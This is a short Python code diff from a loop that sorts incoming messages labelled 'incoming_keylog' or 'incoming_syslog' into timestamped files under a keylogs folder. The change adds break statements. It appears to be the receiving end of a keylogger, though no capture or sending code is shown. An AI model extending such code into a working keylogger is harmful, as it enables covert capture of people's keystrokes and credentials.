@@ -26,8 +26,10 @@ while(True):
     current_time = now.strftime("%H_%M_%S")
     if data.decode() == "incoming_keylog":
         filename = ("./keylogs/" + current_time + "_keylog.txt")
+        break
     elif data.decode() == "incoming_syslog":
         filename = ("./keylogs/" + current_time + "_syslog.txt")
+        break
     else:
         print("Received bad data.\n")
         break
